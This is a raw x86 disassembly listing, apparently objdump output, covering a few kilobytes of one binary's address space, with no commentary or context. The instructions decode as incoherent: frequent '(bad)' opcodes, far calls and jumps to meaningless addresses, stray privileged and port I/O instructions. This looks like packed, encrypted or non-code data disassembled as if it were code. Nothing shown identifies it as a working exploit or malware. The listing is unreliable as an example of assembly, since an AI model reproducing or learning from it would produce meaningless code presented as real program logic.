  4174ff:	sub    ebx,DWORD PTR [ecx+0x5a318146]
  417505:	div    BYTE PTR [esi]
  417507:	(bad)  
  417508:	cmp    dl,al
  41750a:	push   cs
  41750b:	sar    ah,1
  41750d:	or     eax,0x218880f4
  417512:	ror    edx,0x50
  417515:	stc    
  417516:	add    esi,DWORD PTR ds:0x5dacd4e0
  41751c:	rcl    DWORD PTR ds:0x6cfa2194,1
  417522:	push   ds
  417523:	mov    esp,0x7f952e20
  417528:	das    
  417529:	addr16 inc esi
  41752b:	inc    ecx
  41752c:	fnop   
  41752e:	imul   edx,DWORD PTR [ebx-0x29],0x31de07a
  417535:	xchg   ebx,eax
  417536:	ss mov bl,0xd8
  417539:	enter  0xdefa,0xe1
  41753d:	sbb    DWORD PTR [ebx-0x4b],0x83096f57
  417544:	push   esp
  417545:	fwait
  417546:	sbb    DWORD PTR [eax],esp
  417548:	imul   BYTE PTR [eax]
  41754a:	outs   dx,BYTE PTR ds:[esi]
  41754b:	inc    eax
  41754c:	pop    esi
  41754d:	cmp    al,ah
  41754f:	jb     0x417516
  417551:	mov    BYTE PTR [edi+0x34],ch
  417554:	rcl    BYTE PTR ds:[edx-0x44],0x17
  417559:	mov    esi,0xe9a207f5
  41755e:	or     DWORD PTR [ebx+0x16d59daf],ecx
  417564:	mov    ds:0xcc17bc34,al
  417569:	cmp    eax,0x8247d952
  41756e:	add    BYTE PTR [eax],al
  417570:	cmp    DWORD PTR [ebp-0x13a7a2dd],eax
  417576:	xchg   ebp,eax
  417577:	push   eax
  417578:	sub    al,0x40
  41757a:	rcl    ebx,0xfc
  41757d:	jno    0x4175e4
  41757f:	ret    0x1eeb
  417582:	sar    BYTE PTR [edi],1
  417584:	sti    
  417585:	ja     0x417508
  417587:	sbb    ebx,0x78d186f9
  41758d:	outs   dx,DWORD PTR ds:[esi]
  41758e:	adc    eax,0x4422667b
  417593:	xchg   BYTE PTR [edx-0x4c],dh
  417596:	mov    edi,0xc81525b9
  41759b:	int    0x10
  41759d:	cmp    BYTE PTR [eax-0x7e11c6e7],ch
  4175a3:	mov    bl,0xfe
  4175a5:	xchg   esp,eax
  4175a6:	xchg   edi,eax
  4175a7:	loop   0x4175f9
  4175a9:	ds inc edi
  4175ab:	jno    0x417562
  4175ad:	ret    0xfe2b
  4175b0:	inc    esp
  4175b1:	stos   BYTE PTR es:[edi],al
  4175b2:	into   
  4175b3:	mov    edi,0x79da4d1
  4175b8:	jp     0x417576
  4175ba:	adc    DWORD PTR [edi-0x37148178],ebx
  4175c0:	xor    bl,BYTE PTR [eax]
  4175c2:	mov    eax,ds:0x551cdab0
  4175c7:	xor    al,0x2f
  4175c9:	pop    es
  4175ca:	(bad)  
  4175cb:	mov    ds:0x18452746,eax
  4175d0:	mov    edi,0x21e126f4
  4175d5:	pop    edx
  4175d6:	arpl   dx,si
  4175d8:	mov    esp,ecx
  4175da:	mov    WORD PTR [ebp-0x64f11ce9],ss
  4175e0:	xor    ebx,DWORD PTR [ebx+0x210fda1e]
  4175e6:	xchg   esp,eax
  4175e7:	minps  xmm1,XMMWORD PTR [edi]
  4175ea:	adc    ebx,edx
  4175ec:	mov    bl,0xfd
  4175ee:	push   edi
  4175ef:	mov    esi,0xeba859c8
  4175f4:	push   ecx
  4175f5:	leave  
  4175f6:	pop    ebp
  4175f7:	adc    eax,0xfbd26c22
  4175fc:	ss ret 0xf12f
  417600:	dec    edi
  417601:	scas   eax,DWORD PTR es:[edi]
  417602:	and    DWORD PTR [ecx-0x652d95fd],esp
  417608:	cmp    al,0xbc
  41760a:	xlat   BYTE PTR ds:[ebx]
  41760b:	pop    eax
  41760c:	mov    ah,bl
  41760e:	jbe    0x417678
  417610:	les    ebp,FWORD PTR [eax-0x4]
  417613:	sub    esp,ebp
  417615:	fimul  WORD PTR [ebx+0x69]
  417618:	rcr    BYTE PTR [edx],0x74
  41761b:	leave  
  41761c:	out    dx,eax
  41761d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41761e:	xchg   esi,eax
  41761f:	pop    es
  417620:	dec    edi
  417621:	jge    0x417611
  417623:	lahf   
  417624:	inc    esi
  417625:	or     bh,dh
  417627:	ret    0x67b1
  41762a:	jecxz  0x417669
  41762c:	xchg   BYTE PTR [edx-0x4],ch
  41762f:	sub    BYTE PTR [ecx-0x15],bl
  417632:	outs   dx,DWORD PTR ds:[esi]
  417633:	aas    
  417634:	jge    0x417685
  417636:	lahf   
  417637:	sbb    ch,BYTE PTR [ebp+ebp*4-0x11]
  41763b:	loopne 0x417647
  41763d:	sub    dh,BYTE PTR ds:0x4e441176
  417643:	sbb    bh,BYTE PTR [eax-0x30e9b300]
  417649:	sbb    DWORD PTR [edi-0x7f018dca],ebx
  41764f:	call   0xfb8a:0x5c3918
  417656:	clc    
  417657:	pop    esp
  417658:	mov    edi,0xaf1f443a
  41765d:	lahf   
  41765e:	jmp    0xe6ab4fa6
  417663:	repz or DWORD PTR [esi],edi
  417666:	mov    ds:0xd40414ee,eax
  41766b:	add    BYTE PTR [eax-0x1a2a0ca7],0x2a
  417672:	enter  0xde46,0x7b
  417676:	in     eax,dx
  417677:	ss add eax,0x42821f53
  41767d:	repz aad 0x8d
  417680:	adc    eax,0x29000c9a
  417685:	mov    ds:0x75dc3042,al
  41768a:	and    esp,0xffffffca
  41768d:	xor    bl,ah
  41768f:	pushf  
  417690:	push   es
  417691:	push   ecx
  417692:	shl    BYTE PTR [edi+0x17c171e1],0xe9
  417699:	push   0x2437e971
  41769e:	bound  esi,QWORD PTR fs:[edi+0x25381a7f]
  4176a5:	fdivr  DWORD PTR [esi+edx*8]
  4176a8:	jns    0x41763b
  4176aa:	mov    bl,0x29
  4176ac:	sbb    al,0xcb
  4176ae:	imul   esp,DWORD PTR [ebx+0x4],0x88014baf
  4176b5:	sbb    edi,eax
  4176b7:	(bad)  
  4176b8:	jbe    0x4176d4
  4176ba:	mov    bl,0xe6
  4176bc:	hlt    
  4176bd:	pop    ss
  4176be:	jb     0x417670
  4176c0:	xchg   ecx,eax
  4176c1:	pop    es
  4176c2:	or     eax,0x8a5bf94f
  4176c7:	xor    DWORD PTR [ebx-0x15],ecx
  4176ca:	(bad)  
  4176cb:	and    esp,eax
  4176cd:	arpl   WORD PTR [ebx],ax
  4176cf:	sbb    esp,DWORD PTR [edi-0x36]
  4176d2:	call   0xc236a3de
  4176d7:	mov    cl,BYTE PTR [ecx+0x15e1031e]
  4176dd:	shl    BYTE PTR [ecx-0x5f87469c],0xaf
  4176e4:	cmp    dh,BYTE PTR [edi+0x108c11c7]
  4176ea:	in     eax,0xec
  4176ec:	push   ebp
  4176ed:	mov    ch,0x7e
  4176ef:	push   eax
  4176f0:	hlt    
  4176f1:	push   edx
  4176f2:	sbb    esi,DWORD PTR [ecx-0xa]
  4176f5:	sbb    dl,bh
  4176f7:	mov    bh,BYTE PTR [ecx-0x80]
  4176fa:	aad    0xb7
  4176fc:	aaa    
  4176fd:	cwde   
  4176fe:	and    cl,BYTE PTR [ebx]
  417700:	cmp    al,0x54
  417702:	rol    DWORD PTR [ebx-0x70c240f0],1
  417708:	cmp    eax,0xa7a21924
  41770d:	jl     0x4176ce
  41770f:	fs retf 
  417711:	push   ecx
  417712:	pop    ebx
  417713:	pop    ebp
  417714:	lahf   
  417715:	nop
  417716:	adc    BYTE PTR [esi-0x6b],0xad
  41771a:	xlat   BYTE PTR ds:[ebx]
  41771b:	fiadd  DWORD PTR [ecx]
  41771d:	mov    ah,0x9e
  41771f:	in     eax,0x8b
  417721:	shl    ebp,0xac
  417724:	pop    ebx
  417725:	mov    edi,DWORD PTR [ebp+0x1b]
  417728:	inc    esp
  417729:	js     0x4176fc
  41772b:	std    
  41772c:	jl     0x41771f
  41772e:	xchg   DWORD PTR [edi-0x5c],edx
  417731:	mov    WORD PTR [esi],fs
  417733:	mov    WORD PTR [edi-0x182e4a41],gs
  417739:	int3   
  41773a:	pop    esp
  41773b:	shr    BYTE PTR [ecx-0x11858c33],cl
  417741:	add    ch,BYTE PTR [ecx-0x53c312e7]
  417747:	push   0x4d7336a3
  41774c:	push   edi
  41774d:	fld    TBYTE PTR [ebx+0x423d1e33]
  417753:	cs xchg esi,eax
  417755:	jmp    0xbd1f:0x4a06565a
  41775c:	das    
  41775d:	adc    eax,esp
  41775f:	call   0x1a8f6677
  417764:	or     ebx,DWORD PTR [ecx]
  417766:	ds out 0xa4,al
  417769:	jmp    0x417797
  41776b:	inc    ebx
  41776c:	or     eax,0x82fad6f5
  417771:	push   0x39
  417773:	sub    DWORD PTR [esi+0x29],eax
  417776:	cld    
  417777:	xchg   esi,eax
  417778:	adc    BYTE PTR [esi+0x44],ah
  41777b:	push   edi
  41777c:	add    eax,0xc2591c74
  417781:	cmc    
  417782:	mov    al,0x1f
  417784:	jg     0x41771f
  417786:	mov    eax,ds:0xb8cf4fd4
  41778b:	popf   
  41778c:	test   eax,0xa47d5986
  417791:	lock lods al,BYTE PTR ds:[esi]
  417793:	das    
  417794:	gs sbb eax,0x9ad0d58c
  41779a:	push   ecx
  41779b:	lods   al,BYTE PTR ds:[esi]
  41779c:	cmp    al,0x9c
  41779e:	xchg   ecx,eax
  41779f:	jo     0x4177ab
  4177a1:	cmp    al,0x9d
  4177a3:	jle    0x417813
  4177a5:	sub    ebp,DWORD PTR [ecx]
  4177a7:	mov    edx,0x3c40e666
  4177ac:	and    BYTE PTR [esi+0x2d8f483d],bh
  4177b2:	dec    esp
  4177b3:	aaa    
  4177b4:	ret    
  4177b5:	sub    BYTE PTR [edi+0x6a],ch
  4177b8:	inc    edi
  4177b9:	imul   ecx,DWORD PTR [ecx-0x47],0x4b23e641
  4177c0:	jmp    0x8a1f:0xe39c6f5e
  4177c7:	call   0x72eb:0xb7dfd35d
  4177ce:	dec    ebp
  4177cf:	lds    edx,FWORD PTR [edx-0xdc8c2c7]
  4177d5:	jmp    FWORD PTR [ebp-0x27]
  4177d8:	sub    ecx,edx
  4177da:	adc    cl,BYTE PTR [edx*1-0x306a7795]
  4177e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177e2:	arpl   WORD PTR [esi],cx
  4177e4:	in     eax,0x95
  4177e6:	ins    DWORD PTR es:[edi],dx
  4177e7:	retf   
  4177e8:	imul   esp,DWORD PTR [esp+esi*2+0x28dcaba1],0x4b
  4177f0:	loop   0x4177b7
  4177f2:	mov    ds:0xd2d9570b,al
  4177f7:	sub    BYTE PTR [eax+0x485e47da],dh
  4177fd:	jecxz  0x41778f
  4177ff:	stc    
  417800:	(bad)  
  417801:	pusha  
  417802:	icebp  
  417803:	iret   
  417804:	hlt    
  417805:	push   edi
  417806:	retf   0x1f2
  417809:	sahf   
  41780a:	xor    al,0xb6
  41780c:	push   ds
  41780d:	xor    esi,DWORD PTR [edi-0x1d55997]
  417813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417814:	mov    ds:0x694fff37,al
  417819:	imul   ebx,esp,0xffffffcd
  41781c:	pop    ebp
  41781d:	and    edx,eax
  41781f:	and    edx,DWORD PTR [ebx+0x22]
  417822:	repnz loope 0x417844
  417825:	arpl   dx,bp
  417827:	inc    esp
  417828:	xor    ebx,DWORD PTR [eax]
  41782a:	das    
  41782b:	pop    ebx
  41782c:	aaa    
  41782d:	int    0xb
  41782f:	test   DWORD PTR [ecx-0x4f],esi
  417832:	es push ds
  417834:	loop   0x417802
  417836:	test   DWORD PTR [edx+edx*8-0x34],eax
  41783a:	adc    ecx,ebp
  41783c:	leave  
  41783d:	push   ebp
  41783e:	popf   
  41783f:	test   eax,0xcf2a7ca8
  417844:	add    eax,0xabdf9f9c
  417849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41784a:	das    
  41784b:	scas   al,BYTE PTR es:[edi]
  41784c:	xor    BYTE PTR [ecx-0x32],bh
  41784f:	and    dh,BYTE PTR [esi+eax*8-0x6e60273b]
  417856:	mov    ds:0x1ed50465,eax
  41785b:	dec    ebp
  41785c:	ja     0x417859
  41785e:	sar    dl,0x6d
  417861:	add    ah,BYTE PTR [ebx+0x458a8ad8]
  417867:	xchg   edx,eax
  417868:	pop    eax
  417869:	adc    eax,0x4dac1055
  41786e:	push   ecx
  41786f:	loope  0x4178b7
  417871:	jmp    FWORD PTR ds:0xdf0015de
  417877:	fstp   QWORD PTR [edx+edi*2-0x80]
  41787b:	mov    dh,0x15
  41787d:	out    dx,al
  41787e:	fadd   QWORD PTR [esi]
  417880:	mov    esi,0x6a61dd5f
  417885:	xchg   edi,eax
  417886:	mov    eax,0x131bccfb
  41788b:	mov    ebx,0x749589cc
  417890:	fist   DWORD PTR [edx]
  417892:	mov    edx,0xaa78d16e
  417897:	and    ebx,DWORD PTR [eax]
  417899:	mov    ?,esp
  41789b:	xchg   esp,eax
  41789c:	push   cs
  41789d:	dec    eax
  41789e:	sub    dh,ah
  4178a0:	xchg   ebp,eax
  4178a1:	cmp    dh,BYTE PTR [esi]
  4178a3:	outs   dx,DWORD PTR ds:[esi]
  4178a4:	adc    al,0x68
  4178a6:	mov    bl,0xc8
  4178a8:	push   esp
  4178a9:	dec    BYTE PTR [ecx-0x3d]
  4178ac:	fbstp  TBYTE PTR [edi+0x6af19262]
  4178b2:	push   ebx
  4178b3:	loope  0x41784c
  4178b5:	je     0x4178c8
  4178b7:	dec    edi
  4178b8:	(bad)  
  4178b9:	es adc edi,esi
  4178bc:	adc    eax,0xfe978b09
  4178c1:	call   0x27e141d9
  4178c6:	mov    edi,0x1fc0fad9
  4178cb:	fcmovnbe st,st(3)
  4178cd:	mov    edx,0xedeb724b
  4178d2:	inc    esp
  4178d3:	std    
  4178d4:	das    
  4178d5:	cmc    
  4178d6:	push   ss
  4178d7:	pop    ebx
  4178d8:	fdiv   QWORD PTR [edi-0x5d]
  4178db:	pusha  
  4178dc:	mov    bl,0x4f
  4178de:	pop    es
  4178df:	fstp   st(1)
  4178e1:	std    
  4178e2:	(bad)  
  4178e3:	lahf   
  4178e4:	shl    eax,cl
  4178e6:	inc    esi
  4178e7:	fwait
  4178e8:	leave  
  4178e9:	mov    ebp,0x7be294ce
  4178ee:	pop    es
  4178ef:	aaa    
  4178f0:	inc    ebx
  4178f1:	dec    edi
  4178f2:	pop    ss
  4178f3:	mov    dh,BYTE PTR [ebx-0x400745f4]
  4178f9:	jno    0x4178ff
  4178fb:	or     eax,0x52408635
  417900:	stos   BYTE PTR es:[edi],al
  417901:	jb     0x41796c
  417903:	pop    ss
  417904:	mov    bl,0x36
  417906:	mov    ds:0x45b6ab23,al
  41790b:	arpl   ax,dx
  41790d:	dec    edi
  41790e:	hlt    
  41790f:	cmp    cl,BYTE PTR ds:0x6cf90199
  417915:	ins    BYTE PTR es:[di],dx
  417917:	(bad)  
  417918:	push   ebx
  417919:	dec    ecx
  41791a:	outs   dx,BYTE PTR ds:[esi]
  41791b:	(bad)  
  41791c:	or     DWORD PTR [ebx+edi*2],ecx
  41791f:	adc    al,0x73
  417921:	lahf   
  417922:	mov    dh,BYTE PTR [eax+0x30]
  417925:	and    DWORD PTR [ebp+0x31b072ab],eax
  41792b:	adc    dl,ch
  41792d:	es dec esp
  41792f:	fsub   DWORD PTR [ebx]
  417931:	call   DWORD PTR [ecx-0x5a]
  417934:	cs inc ebp
  417936:	push   esi
  417937:	out    dx,al
  417938:	inc    eax
  417939:	mov    dh,0x16
  41793b:	and    DWORD PTR [eax-0x70],ecx
  41793e:	push   ebx
  41793f:	cmp    ebp,DWORD PTR [edi]
  417941:	mov    ebp,0x1e49e17e
  417946:	lock ins DWORD PTR es:[edi],dx
  417948:	retf   0x74f1
  41794b:	mov    bh,0xac
  41794d:	and    ebp,DWORD PTR [ebp-0x46]
  417950:	out    0x73,al
  417952:	aaa    
  417953:	mov    ch,0xa0
  417955:	ds cwde 
  417957:	dec    esp
  417958:	mov    ds:0x23a2f453,eax
  41795d:	jle    0x417979
  41795f:	not    DWORD PTR [esp+esi*2-0x139627d2]
  417966:	fcom   st(1)
  417968:	xlat   BYTE PTR ds:[ebx]
  417969:	stos   BYTE PTR es:[edi],al
  41796a:	loope  0x41793a
  41796c:	cmp    BYTE PTR [esi+esi*8-0x56275813],bh
  417973:	dec    edx
  417974:	mov    ds:0xec007f15,eax
  417979:	popa   
  41797a:	adc    eax,0x7734855d
  41797f:	sbb    edx,edi
  417981:	push   ds
  417982:	daa    
  417983:	sub    al,0x12
  417985:	adc    esi,DWORD PTR [edi+ebx*8+0x2950132f]
  41798c:	shl    BYTE PTR [edi+0x60],cl
  41798f:	aad    0x21
  417991:	out    0xe4,eax
  417993:	ja     0x417982
  417995:	das    
  417996:	retf   
  417997:	call   0x360b:0x8b21fe92
  41799e:	adc    ebx,DWORD PTR [edi+0x0]
  4179a1:	or     esp,DWORD PTR [ebx+0x50]
  4179a4:	(bad)  
  4179a6:	in     al,dx
  4179a7:	fs push esp
  4179a9:	dec    edi
  4179aa:	jo     0x4179dc
  4179ac:	sub    bh,ch
  4179ae:	inc    edi
  4179af:	fimul  WORD PTR [edi]
  4179b1:	ja     0x4179ab
  4179b3:	or     edx,DWORD PTR [esi+0x11f350d1]
  4179b9:	scas   al,BYTE PTR es:[edi]
  4179ba:	aas    
  4179bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179bc:	jl     0x4179ab
  4179be:	mov    esp,esi
  4179c0:	ss cdq 
  4179c2:	push   edx
  4179c3:	adc    eax,0xd0fc6a27
  4179c8:	and    dl,BYTE PTR [edi+0x1f06e090]
  4179ce:	jbe    0x417a4f
  4179d0:	push   cs
  4179d1:	ror    DWORD PTR [ebp+0x57f7b3d3],1
  4179d7:	ins    BYTE PTR es:[edi],dx
  4179d8:	fdiv   st(1),st
  4179da:	mov    dl,0xcf
  4179dc:	xchg   esp,eax
  4179dd:	mov    dl,0x26
  4179df:	jnp    0x41797a
  4179e1:	imul   esp,DWORD PTR [edi+0x49c51bb7],0x47
  4179e8:	add    edx,DWORD PTR [ecx]
  4179ea:	inc    esp
  4179eb:	fistp  QWORD PTR [ebx]
  4179ed:	push   ebx
  4179ee:	add    bh,BYTE PTR [edi+eax*1-0x52df8354]
  4179f5:	in     eax,dx
  4179f6:	adc    BYTE PTR [ecx-0x3c],dh
  4179f9:	sbb    cl,BYTE PTR [edi-0x79]
  4179fc:	popf   
  4179fd:	mov    bh,0x5
  4179ff:	or     DWORD PTR [eax-0x26c926e5],ecx
  417a05:	mov    eax,0x62f5a740
  417a0a:	mov    dh,0x12
  417a0c:	addr16 inc eax
  417a0e:	gs inc ecx
  417a10:	inc    edi
  417a11:	pushf  
  417a12:	inc    ebx
  417a13:	ds ror ch,1
  417a16:	shl    DWORD PTR [edx],0x54
  417a19:	std    
  417a1a:	jnp    0x417a69
  417a1c:	fs sbb eax,0x840d54e2
  417a22:	mov    ebp,0xa61c127b
  417a27:	pushf  
  417a28:	imul   BYTE PTR [ecx]
  417a2a:	cli    
  417a2b:	xor    al,0xd7
  417a2d:	adc    eax,DWORD PTR [ecx+0x39a35a5d]
  417a33:	xchg   DWORD PTR [esi-0x3c2214d1],ebp
  417a39:	cli    
  417a3a:	jbe    0x417a5f
  417a3c:	enter  0xe974,0x8
  417a40:	dec    ecx
  417a41:	adc    bl,BYTE PTR [esi]
  417a43:	fsubr  DWORD PTR [edx]
  417a45:	cmc    
  417a46:	sbb    ch,BYTE PTR [edi-0x2e7c4615]
  417a4c:	mov    bl,0x67
  417a4e:	loop   0x417ac8
  417a50:	dec    esp
  417a51:	mov    edx,0xb3a6544a
  417a56:	aaa    
  417a57:	leave  
  417a58:	sbb    DWORD PTR [ecx-0x52],esi
  417a5b:	xchg   edi,eax
  417a5c:	ret    0x4998
  417a5f:	mov    cs,WORD PTR ds:0x95e2af18
  417a65:	adc    esi,0x7a96e5b4
  417a6b:	inc    ecx
  417a6c:	pop    edx
  417a6d:	jns    0x417ad9
  417a6f:	xor    DWORD PTR [edi-0x55e4be23],ebp
  417a75:	sbb    ah,bh
  417a77:	cmp    al,0x2f
  417a79:	test   DWORD PTR [ebx+0x1f507fd2],esi
  417a7f:	scas   al,BYTE PTR es:[edi]
  417a80:	fcmovne st,st(4)
  417a82:	pop    ds
  417a83:	retf   
  417a84:	jo     0x417a92
  417a86:	dec    esp
  417a87:	sub    BYTE PTR [ebx],cl
  417a89:	mov    eax,0x928bb27e
  417a8e:	out    dx,al
  417a8f:	lods   eax,DWORD PTR ds:[esi]
  417a90:	fwait
  417a91:	dec    ecx
  417a92:	mov    dh,0xbb
  417a94:	xchg   esp,eax
  417a95:	sbb    al,0x29
  417a97:	cdq    
  417a98:	mov    BYTE PTR [eax],cl
  417a9a:	cli    
  417a9b:	ror    DWORD PTR [esi+ecx*4+0x5b],1
  417a9f:	loop   0x417aa6
  417aa1:	xchg   esp,eax
  417aa2:	in     al,0x12
  417aa4:	shl    BYTE PTR [esi-0x73],0x9a
  417aa8:	push   ds
  417aa9:	and    eax,0xf61ba103
  417aae:	xchg   esi,eax
  417aaf:	cmp    eax,0xa0691f86
  417ab4:	sub    al,0x3d
  417ab6:	cmp    ebp,DWORD PTR [esi-0x75a18a5]
  417abc:	call   0x35400be9
  417ac1:	es (bad) 
  417ac3:	push   edi
  417ac4:	in     eax,dx
  417ac5:	pop    ebx
  417ac6:	iret   
  417ac7:	gs adc eax,0xfe482dea
  417acd:	gs aas 
  417acf:	scas   al,BYTE PTR es:[edi]
  417ad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ad1:	dec    ebp
  417ad2:	mov    ecx,0xe9a51c48
  417ad7:	addr16 mov al,0x6d
  417ada:	mov    esp,DWORD PTR [ebx-0x2bc194ed]
  417ae0:	std    
  417ae1:	or     dh,BYTE PTR [edi+0x1d89a806]
  417ae7:	sbb    bl,bl
  417ae9:	lds    ebx,FWORD PTR cs:[ebp+0x14669c9f]
  417af0:	cmp    bl,al
  417af2:	cdq    
  417af3:	or     eax,DWORD PTR [ebx-0x9]
  417af6:	call   0xf233:0x9040ad62
  417afd:	leave  
  417afe:	mov    eax,0x2ff1e0f4
  417b03:	sbb    ebx,DWORD PTR [eax-0x10a722c9]
  417b09:	test   ebx,eax
  417b0b:	mov    cl,BYTE PTR [edx]
  417b0d:	in     al,0x3a
  417b0f:	cs fwait
  417b11:	cmp    eax,0x27741853
  417b16:	xor    BYTE PTR ds:0xf5b52dab,bh
  417b1c:	sub    DWORD PTR [ecx-0x72],edx
  417b1f:	push   eax
  417b20:	jb     0x417b8d
  417b22:	inc    esp
  417b23:	clc    
  417b24:	clc    
  417b25:	dec    ecx
  417b26:	xchg   ebp,ebx
  417b28:	icebp  
  417b29:	xchg   ecx,eax
  417b2a:	lahf   
  417b2b:	sti    
  417b2c:	retf   
  417b2d:	imul   eax,esp,0xffffffda
  417b30:	adc    al,0x36
  417b32:	mov    al,0xb
  417b34:	nop
  417b35:	pop    ss
  417b36:	jmp    0x417b3a
  417b38:	adc    al,0x55
  417b3a:	loopne 0x417bb5
  417b3c:	int3   
  417b3d:	cli    
  417b3e:	call   0x64f:0x287e2287
  417b45:	sub    bh,BYTE PTR [ebx]
  417b47:	in     eax,0xce
  417b49:	addr16 lahf 
  417b4b:	lea    esi,[eax+0x7b]
  417b4e:	mov    dh,0xae
  417b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b51:	test   eax,0x945ab1e1
  417b56:	cmp    dl,BYTE PTR [esp+esi*1+0x30bb958b]
  417b5d:	jg     0x417b33
  417b5f:	pushf  
  417b60:	push   esi
  417b61:	ret    
  417b62:	ret    
  417b63:	pop    ss
  417b64:	leave  
  417b65:	add    bl,0x20
  417b68:	cli    
  417b69:	cwde   
  417b6a:	mov    ch,0x2a
  417b6c:	sbb    eax,0xf17adc45
  417b71:	mov    edi,0xf9bdc5b8
  417b76:	cmp    DWORD PTR [ebp-0x6f839569],ecx
  417b7c:	adc    al,0xe
  417b7e:	int3   
  417b7f:	add    BYTE PTR ds:0x861195ac,dh
  417b85:	inc    eax
  417b86:	popa   
  417b87:	mov    edi,0x9facc1
  417b8c:	mov    ebp,0xcfa39a55
  417b91:	mov    eax,0xad08a34b
  417b96:	pop    edx
  417b97:	jmp    0xfaa8327c
  417b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b9d:	fstp   DWORD PTR [ecx-0x2a1fe48f]
  417ba3:	mov    ?,WORD PTR [ebx]
  417ba5:	push   0x2e
  417ba7:	pop    ecx
  417ba8:	adc    DWORD PTR [edi],eax
  417baa:	xchg   ebx,eax
  417bab:	mov    bl,0x8b
  417bad:	add    eax,0xccc6e4b3
  417bb2:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  417bb4:	inc    ebx
  417bb5:	push   0x5b4759fd
  417bba:	fadd   DWORD PTR [edi+0x587b0493]
  417bc0:	adc    bh,bl
  417bc2:	mov    dl,0x3e
  417bc4:	outs   dx,DWORD PTR ds:[esi]
  417bc5:	xor    al,bh
  417bc7:	mov    al,0x8c
  417bc9:	xchg   edx,eax
  417bca:	or     edi,DWORD PTR [eax-0x22c79c37]
  417bd0:	ins    BYTE PTR es:[edi],dx
  417bd1:	or     DWORD PTR [edi+ebx*4+0x7c],edi
  417bd5:	jmp    0x417b97
  417bd7:	jmp    0xa1fadf44
  417bdc:	jo     0x417b94
  417bde:	push   ss
  417bdf:	xor    al,0xd8
  417be1:	rcr    DWORD PTR [edx-0x53],cl
  417be4:	pop    esi
  417be5:	cld    
  417be6:	ja     0x417b92
  417be8:	inc    esp
  417be9:	cmp    cl,ah
  417beb:	ins    DWORD PTR es:[edi],dx
  417bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bed:	in     eax,dx
  417bee:	lahf   
  417bef:	mov    WORD PTR [edx-0x4815cfc1],es
  417bf5:	fmul   DWORD PTR ds:0x838eda74
  417bfb:	pop    esp
  417bfc:	arpl   cx,di
  417bfe:	int    0xd6
  417c00:	bnd js 0x417c55
  417c03:	xor    BYTE PTR [ecx-0x3fc6f1f9],dh
  417c09:	scas   eax,DWORD PTR es:[edi]
  417c0a:	xor    BYTE PTR [esi],ch
  417c0c:	dec    edi
  417c0d:	xor    al,BYTE PTR [ebx]
  417c0f:	mov    ds:0x8c704280,eax
  417c14:	mov    edx,0xce88bbdb
  417c19:	(bad)  
  417c1b:	and    ebp,DWORD PTR [edx+0x29dfe3a8]
  417c21:	lods   al,BYTE PTR ds:[esi]
  417c22:	xor    eax,0xa4e47c3b
  417c27:	gs mov ebx,0x5e0def9c
  417c2d:	mov    ecx,0xe0b89cb3
  417c32:	mov    al,ds:0x247d50b3
  417c37:	imul   ecx,ecx,0xffffffee
  417c3a:	cwde   
  417c3b:	mov    ds:0x4c583b0f,al
  417c40:	dec    ebx
  417c41:	ja     0x417ca7
  417c43:	pop    ecx
  417c44:	jl     0x417bda
  417c46:	adc    eax,0x82f7c2e3
  417c4b:	sub    al,BYTE PTR [ebx+0x690a182c]
  417c51:	push   esi
  417c52:	cmp    DWORD PTR [esp+edi*1],esi
  417c55:	ins    BYTE PTR es:[edi],dx
  417c56:	sub    bh,dh
  417c58:	push   edx
  417c59:	jno    0x417cd3
  417c5b:	(bad)  
  417c5c:	loopne 0x417bfa
  417c5e:	stos   BYTE PTR es:[edi],al
  417c5f:	test   edi,edi
  417c61:	or     DWORD PTR ds:0xd2724e2b,edx
  417c67:	inc    esp
  417c68:	jno    0x417c88
  417c6a:	mov    dl,0x9
  417c6c:	jne    0x417c2c
  417c6e:	in     al,dx
  417c6f:	add    BYTE PTR ds:0xe8dcbe,bl
  417c75:	into   
  417c76:	mov    edx,0xaa9f1387
  417c7b:	pop    ebx
  417c7c:	enter  0x8ead,0x4
  417c80:	add    ah,BYTE PTR [ebx-0x40]
  417c83:	pop    esi
  417c84:	xor    eax,0xa10fa441
  417c89:	jno    0x417c86
  417c8b:	pop    ebp
  417c8c:	enter  0xc6aa,0x59
  417c90:	pop    ebx
  417c91:	sbb    edi,ebp
  417c93:	dec    esi
  417c94:	and    DWORD PTR [edi-0x274932fb],ebx
  417c9a:	das    
  417c9b:	retf   
  417c9c:	sub    edx,DWORD PTR [ebp-0x36]
  417c9f:	shr    BYTE PTR [edx],0x24
  417ca2:	sahf   
  417ca3:	test   BYTE PTR [ebx],ah
  417ca5:	push   esi
  417ca6:	stc    
  417ca7:	nop
  417ca8:	sbb    al,0x29
  417caa:	mov    bl,0x67
  417cac:	int    0x57
  417cae:	xchg   edx,eax
  417caf:	pop    edi
  417cb0:	push   0x9133ee41
  417cb5:	mov    ebx,0x85b370ec
  417cba:	sbb    dl,dl
  417cbc:	call   0x36f1:0x17cbcfbc
  417cc3:	adc    ch,dl
  417cc5:	loope  0x417c6a
  417cc7:	jno    0x417d2f
  417cc9:	mov    eax,0x20c4fb51
  417cce:	dec    esi
  417ccf:	pop    ebp
  417cd0:	addr16 pop ecx
  417cd2:	ret    
  417cd3:	cmc    
  417cd4:	imul   edx,DWORD PTR [ebp-0xe07522d],0x45
  417cdb:	jl     0x417ceb
  417cdd:	out    0x1f,al
  417cdf:	push   edx
  417ce0:	sbb    ch,bh
  417ce2:	push   ebp
  417ce3:	les    esi,FWORD PTR [ecx+0x11427cf8]
  417ce9:	jno    0x417d46
  417ceb:	pop    edx
  417cec:	xchg   ebp,eax
  417ced:	sbb    BYTE PTR [eax+0x2f],cl
  417cf0:	jg     0x417d71
  417cf2:	sahf   
  417cf3:	out    0x6b,al
  417cf5:	jg     0x417d58
  417cf7:	loope  0x417cb8
  417cf9:	add    ah,BYTE PTR [edi]
  417cfb:	fisub  DWORD PTR [edi]
  417cfd:	cmc    
  417cfe:	clc    
  417cff:	jne    0x417cd7
  417d01:	(bad)  [ecx+0x58]
